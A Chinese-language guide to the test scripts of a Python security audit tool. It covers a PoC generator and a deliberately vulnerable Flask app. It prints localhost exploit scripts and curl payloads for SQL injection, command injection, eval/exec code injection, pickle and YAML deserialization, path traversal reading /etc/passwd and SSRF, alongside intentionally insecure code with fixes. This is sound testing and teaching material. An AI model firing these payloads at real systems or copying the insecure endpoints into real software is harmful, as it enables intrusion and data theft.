# Tests 文件夹使用指南

## 📚 概述

`tests/` 文件夹包含 5 个测试脚本，用于测试代码安全审计工具的各项功能。这些脚本涵盖了从漏洞检测、审计引擎、PoC 生成到 Sink 点检测的完整测试流程。

---

## 📁 测试脚本列表

| 序号 | 脚本名称 | 功能描述 | 主要用途 |
|-----|---------|---------|---------|
| 1 | `test_audit.py` | 审计工具集成测试 | 测试完整的审计流程 |
| 2 | `test_poc.py` | PoC 生成功能测试 | 测试概念验证代码生成 |
| 3 | `test_sink_detection.py` | Sink 点检测测试 | 测试危险函数识别 |
| 4 | `test_vulnerable_app.py` | 漏洞应用示例 | 包含多种漏洞的 Flask 应用 |
| 5 | `test_all_vulnerabilities.py` | 全漏洞测试靶场 | 10 种漏洞类型的完整测试 |

---

## 1️⃣ test_audit.py - 审计工具集成测试

### 📋 脚本简介

`test_audit.py` 是一个端到端的集成测试脚本，用于验证代码审计工具的完整功能流程。

**脚本路径：** `tests/test_audit.py`

**主要功能：**
- ✅ 初始化配置和审计引擎
- ✅ 执行代码审计扫描
- ✅ 显示审计结果统计
- ✅ 生成多格式测试报告

---

### 🎯 使用场景

1. **验证审计工具是否正常工作**
2. **测试审计引擎的扫描能力**
3. **验证报告生成功能**
4. **检查漏洞检测的准确性**

---

### 🚀 快速开始

#### 1. 运行测试

```bash
# 运行审计测试
python tests/test_audit.py
```

#### 2. 预期输出

```
============================================================
代码安全审计工具测试
============================================================

[*] 测试文件: tests\test_vulnerable_app.py
[+] 配置加载成功
[+] 审计引擎初始化成功

[*] 开始执行审计...

============================================================
审计结果
============================================================
目标路径: \tests\test_vulnerable_app.py
检测框架: FLASK
扫描文件: 1
Source点: 10
Sink点: 15
发现漏洞: 12
扫描耗时: 0.45秒

------------------------------------------------------------
漏洞列表:
------------------------------------------------------------

[VULN-0001] SQL Injection in get_user
  类型: SQL_INJECTION
  严重程度: CRITICAL
  位置: \tests\test_vulnerable_app.py:27

[*] 生成测试报告...
  HTML: \test_reports\audit_report.html
  JSON: \test_reports\audit_report.json
  TXT: \test_reports\audit_report.txt

============================================================
测试完成!
============================================================
```

---

### 📊 测试流程

```
1. 检查测试文件存在性
   ↓
2. 加载配置
   ↓
3. 初始化审计引擎
   ↓
4. 执行代码审计
   ↓
5. 显示审计结果
   ↓
6. 生成测试报告
   ↓
7. 完成
```

---

### 🔍 测试内容

#### 1. 配置加载测试
```python
config = Config()
```
验证配置文件能否正确加载。

#### 2. 审计引擎初始化测试
```python
engine = AuditEngine(config)
```
验证审计引擎能否正确初始化。

#### 3. 审计执行测试
```python
result = engine.audit(test_file)
```
验证审计引擎能否正确扫描代码并检测漏洞。

#### 4. 结果验证测试
检查以下指标：
- 目标路径
- 检测框架
- 扫描文件数
- Source 点数量
- Sink 点数量
- 发现漏洞数
- 扫描耗时

#### 5. 报告生成测试
```python
reports = report_gen.generate_all_formats(result, output_dir)
```
验证能否生成 HTML、JSON、TXT 三种格式的报告。

---

### 📁 生成的文件

测试完成后，会在 `tests/test_reports/` 目录下生成：

```
test_reports/
├── audit_report.html    # HTML 格式报告
├── audit_report.json    # JSON 格式报告
└── audit_report.txt     # 文本格式报告
```

---

### ⚠️ 注意事项

1. **依赖要求**
   - 需要安装完整的代码审计工具依赖
   - 需要存在 `test_vulnerable_app.py` 测试文件

2. **输出目录**
   - 测试报告会保存在 `tests/test_reports/` 目录
   - 如果目录不存在会自动创建

3. **测试结果**
   - 成功：返回 0
   - 失败：返回 1

---

### 🐛 故障排除

#### 问题 1：测试文件不存在

**现象：**
```
[!] 测试文件不存在: \tests\test_vulnerable_app.py
```

**解决方案：**
```bash
# 检查文件是否存在
ls tests/test_vulnerable_app.py

# 如果不存在，从其他位置复制或重新创建
```

#### 问题 2：模块导入失败

**现象：**
```
ModuleNotFoundError: No module named 'core.config'
```

**解决方案：**
```bash
# 检查项目结构
ls

# 确保在正确的目录运行
```

#### 问题 3：报告生成失败

**现象：**
```
[!] 报告生成失败: Permission denied
```

**解决方案：**
```bash
# 检查目录权限
# Windows: 以管理员身份运行
# Linux: chmod +x tests/
```

---

### 📈 测试指标说明

| 指标 | 说明 | 正常范围 |
|-----|------|---------|
| 扫描文件 | 被扫描的 Python 文件数量 | ≥ 1 |
| Source 点 | 用户输入点数量 | ≥ 5 |
| Sink 点 | 危险函数调用点数量 | ≥ 10 |
| 发现漏洞 | 检测到的漏洞数量 | ≥ 8 |
| 扫描耗时 | 扫描所需时间（秒） | < 2.0 |

---

## 2️⃣ test_poc.py - PoC 生成功能测试

### 📋 脚本简介

`test_poc.py` 用于测试 PoC（Proof of Concept，概念验证）生成功能。它会创建模拟漏洞并生成对应的 PoC 脚本。

**脚本路径：** `tests/test_poc.py`

**主要功能：**
- ✅ 创建模拟漏洞对象
- ✅ 生成多种类型的 PoC
- ✅ 生成 cURL 命令
- ✅ 生成 Python 脚本
- ✅ 生成利用链脚本

---

### 🎯 使用场景

1. **测试 PoC 生成器的功能**
2. **验证 PoC 格式的正确性**
3. **测试批量 PoC 生成**
4. **验证利用链生成能力**

---

### 🚀 快速开始

#### 1. 运行测试

```bash
# 运行 PoC 生成测试
python tests/test_poc.py
```

#### 2. 预期输出

```
============================================================
PoC生成功能测试
============================================================

[+] 初始化配置...
    配置加载成功

[+] 初始化PoC生成器...
    PoC生成器初始化成功

[+] 创建测试漏洞...

[+] 生成 3 个漏洞的PoC...
    成功生成 3 个PoC

============================================================
PoC详情
============================================================

[PoC 1] SQL_INJECTION
------------------------------------------------------------
URL: http://localhost:5000/login
方法: POST
Payload: {"username": "admin' OR '1'='1", "password": "any"}
预期结果: SQL注入成功，绕过认证

cURL命令:
  curl -X POST http://localhost:5000/login -H "Content-Type: application/json" -d "{\"username\": \"admin' OR '1'='1\", \"password\": \"any\"}"

Python代码 (前500字符):
  #!/usr/bin/env python3
  # -*- coding: utf-8 -*-
  """
  PoC for SQL_INJECTION - VULN-0001
  """
  import requests
  import json

  ...

[PoC 2] COMMAND_INJECTION
------------------------------------------------------------
URL: http://localhost:5000/ping
方法: GET
Payload: {"ip": "8.8.8.8; whoami"}
预期结果: 命令注入成功，执行任意命令

...

[PoC 3] XSS
------------------------------------------------------------
URL: http://localhost:5000/search
方法: GET
Payload: {"query": "<script>alert(1)</script>"}
预期结果: XSS攻击成功，执行恶意脚本

...

============================================================
保存PoC到文件
============================================================
[+] 保存PoC: ./test_pocs/poc_VULN-0001_sql_injection.py
[+] 保存PoC: ./test_pocs/poc_VULN-0002_command_injection.py
[+] 保存PoC: ./test_pocs/poc_VULN-0003_xss.py

============================================================
测试利用链生成
============================================================
[+] 保存利用链: ./test_pocs/exploit_chain.py

利用链脚本 (前500字符):
  #!/usr/bin/env python3
  # -*- coding: utf-8 -*-
  """
  利用链脚本 - 自动化漏洞利用
  """
  import requests
  import json

  ...

============================================================
测试完成!
============================================================

生成的文件保存在: ./test_pocs

[+] PoC生成功能测试通过!
```

---

### 📊 测试流程

```
1. 初始化配置和 PoC 生成器
   ↓
2. 创建 3 个测试漏洞
   - SQL 注入
   - 命令注入
   - XSS
   ↓
3. 生成 PoC
   ↓
4. 显示 PoC 详情
   ↓
5. 保存 PoC 到文件
   ↓
6. 生成利用链脚本
   ↓
7. 完成
```

---

### 🔍 测试内容

#### 1. SQL 注入 PoC 测试

**漏洞配置：**
- 路由：`/login`
- 方法：POST
- 参数：`username`, `password`
- Sink：`execute()`

**生成的 PoC：**
```python
# cURL 命令
curl -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' OR '\''1'\''='\''1", "password": "any"}'

# Python 脚本
import requests
import json

url = "http://localhost:5000/login"
payload = {
    "username": "admin' OR '1'='1",
    "password": "any"
}

response = requests.post(url, json=payload)
print(f"Status: {response.status_code}")
print(f"Response: {response.text}")
```

#### 2. 命令注入 PoC 测试

**漏洞配置：**
- 路由：`/ping`
- 方法：GET
- 参数：`ip`
- Sink：`subprocess.run()`

**生成的 PoC：**
```python
# cURL 命令
curl "http://localhost:5000/ping?ip=8.8.8.8; whoami"

# Python 脚本
import requests

url = "http://localhost:5000/ping"
params = {
    "ip": "8.8.8.8; whoami"
}

response = requests.get(url, params=params)
print(f"Response: {response.text}")
```

#### 3. XSS PoC 测试

**漏洞配置：**
- 路由：`/search`
- 方法：GET
- 参数：`query`
- Sink：`render_template_string()`

**生成的 PoC：**
```python
# cURL 命令
curl "http://localhost:5000/search?query=<script>alert(1)</script>"

# Python 脚本
import requests

url = "http://localhost:5000/search"
params = {
    "query": "<script>alert(1)</script>"
}

response = requests.get(url, params=params)
print(f"Response: {response.text}")
```

---

### 📁 生成的文件

测试完成后，会在 `./test_pocs/` 目录下生成：

```
test_pocs/
├── poc_VULN-0001_sql_injection.py      # SQL 注入 PoC
├── poc_VULN-0002_command_injection.py  # 命令注入 PoC
├── poc_VULN-0003_xss.py                # XSS PoC
└── exploit_chain.py                    # 利用链脚本
```

---

### 📝 PoC 文件格式

每个 PoC 文件包含以下内容：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PoC for VULN-0001 - SQL_INJECTION
"""

import requests
import json

# 漏洞信息
VULN_ID = "VULN-0001"
VULN_TYPE = "SQL_INJECTION"
SEVERITY = "CRITICAL"
CWE_ID = "CWE-89"
DESCRIPTION = "登录接口存在SQL注入漏洞"
REMEDIATION = "使用参数化查询或ORM"

# 目标信息
TARGET_URL = "http://localhost:5000/login"
HTTP_METHOD = "POST"
HEADERS = {
    "Content-Type": "application/json"
}

# Payload
PAYLOAD = {
    "username": "admin' OR '1'='1",
    "password": "any"
}

# 预期结果
EXPECTED_RESULT = "SQL注入成功，绕过认证"

def exploit():
    """执行漏洞利用"""
    try:
        response = requests.post(
            TARGET_URL,
            headers=HEADERS,
            json=PAYLOAD
        )

        print(f"[+] 漏洞ID: {VULN_ID}")
        print(f"[+] 漏洞类型: {VULN_TYPE}")
        print(f"[+] 严重程度: {SEVERITY}")
        print(f"[+] CWE ID: {CWE_ID}")
        print(f"[+] 描述: {DESCRIPTION}")
        print(f"[+] 修复建议: {REMEDIATION}")
        print(f"\n[+] 目标URL: {TARGET_URL}")
        print(f"[+] 请求方法: {HTTP_METHOD}")
        print(f"[+] Payload: {PAYLOAD}")
        print(f"\n[+] 状态码: {response.status_code}")
        print(f"[+] 响应内容: {response.text[:200]}")

        if response.status_code == 200:
            print(f"\n[+] {EXPECTED_RESULT}")
        else:
            print(f"\n[-] 漏洞利用可能失败")

    except Exception as e:
        print(f"[-] 错误: {e}")

if __name__ == "__main__":
    exploit()
```

---

### 📝 利用链脚本格式

利用链脚本会自动执行所有漏洞的 PoC：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
利用链脚本 - 自动化漏洞利用
"""

import requests
import json

# 漏洞列表
VULNERABILITIES = [
    {
        "id": "VULN-0001",
        "type": "SQL_INJECTION",
        "url": "http://localhost:5000/login",
        "method": "POST",
        "payload": {"username": "admin' OR '1'='1", "password": "any"}
    },
    {
        "id": "VULN-0002",
        "type": "COMMAND_INJECTION",
        "url": "http://localhost:5000/ping",
        "method": "GET",
        "payload": {"ip": "8.8.8.8; whoami"}
    },
    {
        "id": "VULN-0003",
        "type": "XSS",
        "url": "http://localhost:5000/search",
        "method": "GET",
        "payload": {"query": "<script>alert(1)</script>"}
    }
]

def exploit_all():
    """执行所有漏洞利用"""
    print("="*60)
    print("自动化漏洞利用链")
    print("="*60)

    for vuln in VULNERABILITIES:
        print(f"\n[+] 正在利用: {vuln['id']} - {vuln['type']}")

        try:
            if vuln['method'] == 'POST':
                response = requests.post(vuln['url'], json=vuln['payload'])
            else:
                response = requests.get(vuln['url'], params=vuln['payload'])

            print(f"    状态码: {response.status_code}")
            print(f"    响应: {response.text[:100]}")

        except Exception as e:
            print(f"    错误: {e}")

    print("\n" + "="*60)
    print("利用链执行完成")
    print("="*60)

if __name__ == "__main__":
    exploit_all()
```

---

### ⚠️ 注意事项

1. **依赖要求**
   - 需要安装 `requests` 库
   - 需要 PoC 生成器模块正常工作

2. **输出目录**
   - PoC 文件会保存在 `./test_pocs/` 目录
   - 如果目录不存在会自动创建

3. **测试目的**
   - 仅用于测试 PoC 生成功能
   - 生成的 PoC 需要在实际环境中验证

4. **安全警告**
   - 生成的 PoC 包含真实攻击代码
   - 仅在授权环境中使用
   - 不要在生产环境测试

---

### 🐛 故障排除

#### 问题 1：PoC 生成失败

**现象：**
```
[!] 未能生成任何PoC
```

**解决方案：**
```bash
# 检查 PoC 生成器是否存在
ls /generators/poc_generator.py

# 检查配置是否正确
python -c "from core.config import Config; print(Config())"
```

#### 问题 2：文件保存失败

**现象：**
```
PermissionError: [Errno 13] Permission denied: './test_pocs'
```

**解决方案：**
```bash
# Windows: 以管理员身份运行
# Linux: 修改目录权限
chmod 755 ./test_pocs
```

#### 问题 3：利用链生成失败

**现象：**
```
[!] 利用链生成失败
```

**解决方案：**
```bash
# 检查漏洞对象是否正确创建
python -c "from core.config import Vulnerability, VulnerabilityType; print('OK')"

# 检查 PoC 生成器方法
python -c "from generators.poc_generator import PoCGenerator; print('OK')"
```

---

## 3️⃣ test_sink_detection.py - Sink 点检测测试

### 📋 脚本简介

`test_sink_detection.py` 用于测试 Sink 点（危险函数调用点）检测功能。它会显示所有支持的危险函数，并在测试文件中检测实际的 Sink 点。

**脚本路径：** `tests/test_sink_detection.py`

**主要功能：**
- ✅ 显示支持的危险函数列表
- ✅ 检测测试文件中的 Sink 点
- ✅ 显示 Sink 点详细信息

---

### 🎯 使用场景

1. **验证 Sink 点检测功能**
2. **查看支持的危险函数**
3. **测试 Sink 点识别准确性**
4. **了解工具的检测范围**

---

### 🚀 快速开始

#### 1. 运行测试

```bash
# 运行 Sink 点检测测试
python tests/test_sink_detection.py
```

#### 2. 预期输出

```
============================================================
Sink点检测测试
============================================================

[+] 支持的漏洞类型和危险函数:

sql_injection:
  - execute (模块: sqlite3, pymysql, psycopg2)
  - executemany (模块: sqlite3, pymysql, psycopg2)
  - cursor (模块: sqlite3, pymysql, psycopg2)
  - raw (模块: django.db)

command_injection:
  - system (模块: os)
  - popen (模块: os)
  - subprocess.run (模块: subprocess)
  - subprocess.call (模块: subprocess)
  - subprocess.Popen (模块: subprocess)

code_injection:
  - eval (模块: builtins)
  - exec (模块: builtins)
  - compile (模块: builtins)

deserialization:
  - pickle.loads (模块: pickle)
  - pickle.load (模块: pickle)
  - yaml.load (模块: yaml)
  - yaml.unsafe_load (模块: yaml)

path_traversal:
  - open (模块: builtins)
  - file (模块: builtins)
  - send_file (模块: flask)
  - send_from_directory (模块: flask)

ssrf:
  - urlopen (模块: urllib.request)
  - requests.get (模块: requests)
  - requests.post (模块: requests)
  - session.get (模块: requests)

xss:
  - render_template_string (模块: flask)
  - Markup (模块: markupsafe)
  - escape (模块: markupsafe)

xxe:
  - fromstring (模块: xml.etree.ElementTree)
  - parse (模块: xml.etree.ElementTree)
  - parseString (模块: xml.dom.minidom)

ldap_injection:
  - search_s (模块: ldap)
  - search_ext_s (模块: ldap)

open_redirect:
  - redirect (模块: flask)
  - url_for (模块: flask)

[+] 测试文件: \test_all_vulnerabilities.py
[+] 发现 15 个Sink点

[+] Sink点详情:

1. subprocess.run
   类型: command_injection
   严重程度: critical
   位置: tests\test_all_vulnerabilities.py:39

2. eval
   类型: code_injection
   严重程度: critical
   位置: tests\test_all_vulnerabilities.py:47

3. pickle.loads
   类型: deserialization
   严重程度: critical
   位置: tests\test_all_vulnerabilities.py:55

4. open
   类型: path_traversal
   严重程度: high
   位置: tests\test_all_vulnerabilities.py:64

5. urlopen
   类型: ssrf
   严重程度: high
   位置: tests\test_all_vulnerabilities.py:76

6. render_template_string
   类型: xss
   严重程度: high
   位置: tests\test_all_vulnerabilities.py:85

7. fromstring
   类型: xxe
   严重程度: high
   位置: tests\test_all_vulnerabilities.py:91

8. search_s
   类型: ldap_injection
   严重程度: high
   位置: tests\test_all_vulnerabilities.py:102

9. redirect
   类型: open_redirect
   严重程度: medium
   位置: tests\test_all_vulnerabilities.py:110

...
```

---

### 📊 测试内容

#### 1. 支持的危险函数

脚本会显示所有支持的漏洞类型及其对应的危险函数：

| 漏洞类型 | 危险函数 | 所属模块 |
|---------|---------|---------|
| SQL 注入 | `execute`, `executemany`, `cursor`, `raw` | `sqlite3`, `pymysql`, `psycopg2`, `django.db` |
| 命令注入 | `system`, `popen`, `subprocess.run`, `subprocess.call`, `subprocess.Popen` | `os`, `subprocess` |
| 代码注入 | `eval`, `exec`, `compile` | `builtins` |
| 反序列化 | `pickle.loads`, `pickle.load`, `yaml.load`, `yaml.unsafe_load` | `pickle`, `yaml` |
| 路径遍历 | `open`, `file`, `send_file`, `send_from_directory` | `builtins`, `flask` |
| SSRF | `urlopen`, `requests.get`, `requests.post`, `session.get` | `urllib.request`, `requests` |
| XSS | `render_template_string`, `Markup`, `escape` | `flask`, `markupsafe` |
| XXE | `fromstring`, `parse`, `parseString` | `xml.etree.ElementTree`, `xml.dom.minidom` |
| LDAP 注入 | `search_s`, `search_ext_s` | `ldap` |
| 开放重定向 | `redirect`, `url_for` | `flask` |

#### 2. Sink 点检测

脚本会扫描 `test_all_vulnerabilities.py` 文件，检测其中的 Sink 点：

```python
# 示例：检测到的 Sink 点
{
    "function_name": "subprocess.run",
    "vulnerability_type": "command_injection",
    "severity": "critical",
    "file_path": "tests\\test_all_vulnerabilities.py",
    "line_number": 39
}
```

---

### 🔍 检测原理

#### 1. AST 分析

使用 Python 的 `ast` 模块解析代码：

```python
import ast

# 解析代码
tree = ast.parse(source_code)

# 遍历 AST
for node in ast.walk(tree):
    if isinstance(node, ast.Call):
        # 检测函数调用
        if isinstance(node.func, ast.Attribute):
            function_name = node.func.attr
            # 检查是否为危险函数
            if function_name in dangerous_functions:
                # 记录 Sink 点
```

#### 2. 函数匹配

通过函数名称和所属模块识别危险函数：

```python
dangerous_functions = {
    'subprocess': {
        'run': 'command_injection',
        'call': 'command_injection',
        'Popen': 'command_injection'
    },
    'os': {
        'system': 'command_injection',
        'popen': 'command_injection'
    },
    ...
}
```

---

### ⚠️ 注意事项

1. **依赖要求**
   - 需要 `SinkAnalyzer` 模块正常工作
   - 需要存在 `test_all_vulnerabilities.py` 文件

2. **检测范围**
   - 仅检测已知的危险函数
   - 不检测间接调用和动态调用
   - 不检测自定义封装函数

3. **测试结果**
   - 显示所有支持的危险函数
   - 显示测试文件中的实际 Sink 点
   - 不区分静态调用和动态调用

---

### 🐛 故障排除

#### 问题 1：模块导入失败

**现象：**
```
ModuleNotFoundError: No module named 'analyzers.sink_analyzer'
```

**解决方案：**
```bash
# 检查模块是否存在
ls code_audit_tool/analyzers/sink_analyzer.py

# 确保在正确的目录运行
```

#### 问题 2：测试文件不存在

**现象：**
```
[!] 测试文件不存在: tests\test_all_vulnerabilities.py
```

**解决方案：**
```bash
# 检查文件是否存在
ls tests/test_all_vulnerabilities.py

# 如果不存在，从其他位置复制
```

#### 问题 3：未检测到 Sink 点

**现象：**
```
[+] 发现 0 个Sink点
```

**解决方案：**
```bash
# 检查测试文件内容
cat tests/test_all_vulnerabilities.py

# 检查危险函数配置
python -c "from analyzers.sink_analyzer import SinkAnalyzer; print(SinkAnalyzer(Config()).dangerous_functions)"
```

---

## 4️⃣ test_vulnerable_app.py - 漏洞应用示例

### 📋 脚本简介

`test_vulnerable_app.py` 是一个包含多种安全漏洞的 Flask 应用示例，用于测试代码审计工具的检测能力。

**脚本路径：** `tests/test_vulnerable_app.py`

**主要功能：**
- ✅ 提供 10+ 个漏洞端点
- ✅ 提供 2 个安全端点作为对比
- ✅ 涵盖多种漏洞类型
- ✅ 可直接运行测试

---

### 🎯 使用场景

1. **测试代码审计工具**
2. **学习漏洞原理**
3. **验证漏洞检测准确性**
4. **安全培训和教育**

---

### 🚀 快速开始

#### 1. 启动应用

```bash
# 启动漏洞应用
python tests/test_vulnerable_app.py
```

应用会在 `http://127.0.0.1:5000` 启动。

#### 2. 测试漏洞端点

```bash
# SQL 注入测试
curl "http://127.0.0.1:5000/user/1' OR '1'='1"

# 命令注入测试
curl "http://127.0.0.1:5000/cmd?cmd=whoami"

# 路径遍历测试
curl "http://127.0.0.1:5000/read?file=../../../etc/passwd"

# SSRF 测试
curl "http://127.0.0.1:5000/fetch?url=file:///etc/passwd"

# XSS 测试
curl "http://127.0.0.1:5000/greet?name=<script>alert(1)</script>"
```

---

### 📋 漏洞端点列表

| 序号 | 端点 | 方法 | 漏洞类型 | 严重程度 | 说明 |
|-----|------|------|---------|---------|------|
| 1 | `/user/<user_id>` | GET | SQL 注入 | Critical | 直接拼接用户输入到 SQL 查询 |
| 2 | `/search` | GET | SQL 注入 | Critical | 使用字符串格式化构建 SQL 查询 |
| 3 | `/cmd` | GET | 命令注入 | Critical | 使用 `os.system()` 执行用户命令 |
| 4 | `/ping` | GET | 命令注入 | Critical | 使用 `subprocess.run()` 且 `shell=True` |
| 5 | `/read` | GET | 路径遍历 | High | 直接使用用户输入打开文件 |
| 6 | `/download` | GET | 路径遍历 | High | `send_file()` 使用用户输入路径 |
| 7 | `/fetch` | GET | SSRF | High | 直接请求用户提供的 URL |
| 8 | `/greet` | GET | XSS | High | 将用户输入渲染到模板 |
| 9 | `/comment` | POST | XSS | High | 未转义用户输入 |
| 10 | `/load_data` | POST | 反序列化 | Critical | 反序列化用户提供的 pickle 数据 |
| 11 | `/parse_config` | POST | 反序列化 | Critical | 使用不安全的 `yaml.load()` |
| 12 | `/eval` | GET | 代码注入 | Critical | 使用 `eval()` 执行用户代码 |
| 13 | `/exec` | GET | 代码注入 | Critical | 使用 `exec()` 执行用户代码 |

### 🛡️ 安全端点列表

| 序号 | 端点 | 方法 | 安全措施 | 说明 |
|-----|------|------|---------|------|
| 1 | `/safe_user/<user_id>` | GET | 参数化查询 | 使用 `?` 占位符 |
| 2 | `/safe_ping` | GET | 列表参数 | 使用列表形式，`shell=False` |

---

### 🔍 漏洞详情

#### 1. SQL 注入 - `/user/<user_id>`

**漏洞代码：**

```python
@app.route('/user/<user_id>')
def get_user(user_id):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()

    # 漏洞: 直接拼接用户输入到SQL查询
    query = "SELECT * FROM users WHERE id = " + user_id
    cursor.execute(query)

    user = cursor.fetchone()
    conn.close()
    return str(user)
```

**测试方法：**
```bash
curl "http://127.0.0.1:5000/user/1' OR '1'='1"
```

**修复方法：**
```python
query = "SELECT * FROM users WHERE id = ?"
cursor.execute(query, (user_id,))
```

---

#### 2. SQL 注入 - `/search`

**漏洞代码：**
```python
@app.route('/search')
def search():
    keyword = request.args.get('q', '')

    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()

    # 漏洞: 使用字符串格式化构建SQL查询
    query = f"SELECT * FROM products WHERE name LIKE '%{keyword}%'"
    cursor.execute(query)

    results = cursor.fetchall()
    conn.close()
    return str(results)
```

**测试方法：**
```bash
curl "http://127.0.0.1:5000/search?q=' OR '1'='1"
```

**修复方法：**
```python
query = "SELECT * FROM products WHERE name LIKE ?"
cursor.execute(query, (f'%{keyword}%',))
```

---

#### 3. 命令注入 - `/cmd`

**漏洞代码：**
```python
@app.route('/cmd')
def execute_command():
    cmd = request.args.get('cmd', '')

    # 漏洞: 直接执行用户输入的命令
    result = os.system(cmd)
    return f"Command executed: {result}"
```

**测试方法：**
```bash
curl "http://127.0.0.1:5000/cmd?cmd=whoami"
curl "http://127.0.0.1:5000/cmd?cmd=ls -la"
```

**修复方法：**
```python
# 避免执行用户命令，或使用白名单
allowed_commands = {'ping', 'traceroute'}
if cmd not in allowed_commands:
    return "Invalid command"
```

---

#### 4. 命令注入 - `/ping`

**漏洞代码：**
```python
@app.route('/ping')
def ping():
    host = request.args.get('host', '')

    # 漏洞: 使用shell=True执行用户输入
    result = subprocess.run(f"ping -c 4 {host}", shell=True, capture_output=True)
    return result.stdout.decode()
```

**测试方法：**
```bash
curl "http://127.0.0.1:5000/ping?host=8.8.8.8; whoami"
```

**修复方法：**
```python
result = subprocess.run(['ping', '-c', '4', host], shell=False, capture_output=True)
```

---

#### 5. 路径遍历 - `/read`

**漏洞代码：**
```python
@app.route('/read')
def read_file():
    filename = request.args.get('file', '')

    # 漏洞: 直接使用用户输入作为文件路径
    with open('/var/www/data/' + filename, 'r') as f:
        content = f.read()

    return content
```

**测试方法：**
```bash
curl "http://127.0.0.1:5000/read?file=../../../etc/passwd"
```

**修复方法：**
```python
import os
safe_path = os.path.join('/var/www/data/', os.path.basename(filename))
with open(safe_path, 'r') as f:
    content = f.read()
```

---

#### 6. 路径遍历 - `/download`

**漏洞代码：**
```python
@app.route('/download')
def download():
    filepath = request.args.get('path', '')

    # 漏洞: send_file使用用户输入的路径
    return send_file(filepath)
```

**测试方法：**
```bash
curl "http://127.0.0.1:5000/download?path=/etc/passwd"
```

**修复方法：**
```python
import os
safe_path = os.path.join('/var/www/files/', os.path.basename(filepath))
return send_file(safe_path)
```

---

#### 7. SSRF - `/fetch`

**漏洞代码：**
```python
@app.route('/fetch')
def fetch_url():
    import urllib.request

    url = request.args.get('url', '')

    # 漏洞: 直接请求用户提供的URL
    response = urllib.request.urlopen(url)
    return response.read()
```

**测试方法：**
```bash
curl "http://127.0.0.1:5000/fetch?url=file:///etc/passwd"
curl "http://127.0.0.1:5000/fetch?url=http://localhost:8080/admin"
```

**修复方法：**
```python
from urllib.parse import urlparse
allowed_domains = ['example.com', 'trusted.com']
parsed = urlparse(url)

if parsed.netloc in allowed_domains:
    response = urllib.request.urlopen(url)
    return response.read()
else:
    return "Invalid URL"
```

---

#### 8. XSS - `/greet`

**漏洞代码：**
```python
@app.route('/greet')
def greet():
    name = request.args.get('name', '')

    # 漏洞: 直接将用户输入渲染到模板
    template = f"<h1>Hello, {name}!</h1>"
    return render_template_string(template)
```

**测试方法：**
```bash
# 在浏览器中访问
http://127.0.0.1:5000/greet?name=<script>alert(1)</script>
```

**修复方法：**
```python
from markupsafe import escape

name = escape(request.args.get('name', ''))
template = f"<h1>Hello, {name}!</h1>"
return render_template_string(template)
```

---

#### 9. XSS - `/comment`

**漏洞代码：**
```python
@app.route('/comment', methods=['POST'])
def add_comment():
    comment = request.form.get('comment', '')

    # 漏洞: 未转义用户输入
    html = f"<div class='comment'>{comment}</div>"
    return html
```

**测试方法：**
```bash
curl -X POST "http://127.0.0.1:5000/comment" \
  -d "comment=<script>alert(1)</script>"
```

**修复方法：**
```python
from markupsafe import escape

comment = escape(request.form.get('comment', ''))
html = f"<div class='comment'>{comment}</div>"
return html
```

---

#### 10. 反序列化 - `/load_data`

**漏洞代码：**
```python
@app.route('/load_data', methods=['POST'])
def load_data():
    data = request.data

    # 漏洞: 反序列化用户提供的pickle数据
    obj = pickle.loads(data)
    return str(obj)
```

**测试方法：**
```bash
# 创建恶意 pickle 文件
python -c "import pickle, os; print(pickle.dumps(os.system, 0))" > malicious.pkl

# 发送恶意数据
curl -X POST "http://127.0.0.1:5000/load_data" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @malicious.pkl
```

**修复方法：**
```python
import json
data = request.data
obj = json.loads(data)
```

---

#### 11. 反序列化 - `/parse_config`

**漏洞代码：**
```python
@app.route('/parse_config', methods=['POST'])
def parse_config():
    config = request.data.decode('utf-8')

    # 漏洞: 使用不安全的yaml.load
    data = yaml.load(config, Loader=yaml.Loader)
    return str(data)
```

**测试方法：**
```bash
curl -X POST "http://127.0.0.1:5000/parse_config" \
  -H "Content-Type: application/x-yaml" \
  -d "!!python/object/apply:os.system ['whoami']"
```

**修复方法：**
```python
data = yaml.safe_load(config)
```

---

#### 12. 代码注入 - `/eval`

**漏洞代码：**
```python
@app.route('/eval')
def eval_code():
    code = request.args.get('code', '')

    # 漏洞: 执行用户提供的代码
    result = eval(code)
    return str(result)
```

**测试方法：**
```bash
curl "http://127.0.0.1:5000/eval?code=__import__('os').system('whoami')"
```

**修复方法：**
```python
# 避免使用 eval，或使用安全的替代方案
import ast
result = ast.literal_eval(code)
```

---

#### 13. 代码注入 - `/exec`

**漏洞代码：**
```python
@app.route('/exec')
def exec_code():
    code = request.args.get('code', '')

    # 漏洞: 执行用户提供的代码
    exec(code)
    return "Code executed"
```

**测试方法：**
```bash
curl "http://127.0.0.1:5000/exec?code=import os; os.system('whoami')"
```

**修复方法：**
```python
# 避免使用 exec，使用白名单或沙箱
allowed_functions = {'calculate', 'process'}
# 实现安全的代码执行环境
```

---

### 🛡️ 安全端点

#### 1. 安全 SQL 查询 - `/safe_user/<user_id>`

**安全代码：**
```python
@app.route('/safe_user/<user_id>')
def get_user_safe(user_id):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()

    # 安全: 使用参数化查询
    cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))

    user = cursor.fetchone()
    conn.close()
    return str(user)
```

**测试方法：**
```bash
curl "http://127.0.0.1:5000/safe_user/1"
```

---

#### 2. 安全命令执行 - `/safe_ping`

**安全代码：**
```python
@app.route('/safe_ping')
def ping_safe():
    host = request.args.get('host', '')

    # 安全: 使用列表形式，shell=False
    result = subprocess.run(['ping', '-c', '4', host], shell=False, capture_output=True)
    return result.stdout.decode()
```

**测试方法：**
```bash
curl "http://127.0.0.1:5000/safe_ping?host=8.8.8.8"
```

---

### ⚠️ 安全注意事项

1. **仅用于测试**
   - ❌ 不要部署到生产环境
   - ❌ 不要暴露在公网上
   - ❌ 不要使用真实数据

2. **运行环境**
   - ✅ 仅在本地运行
   - ✅ 使用防火墙限制访问
   - ✅ 定期检查运行状态

3. **测试目的**
   - ✅ 测试代码审计工具
   - ✅ 学习漏洞原理
   - ✅ 安全培训和教育

---

### 🐛 故障排除

#### 问题 1：端口被占用

**现象：**
```
OSError: [WinError 10048] 通常每个套接字地址只能使用一次
```

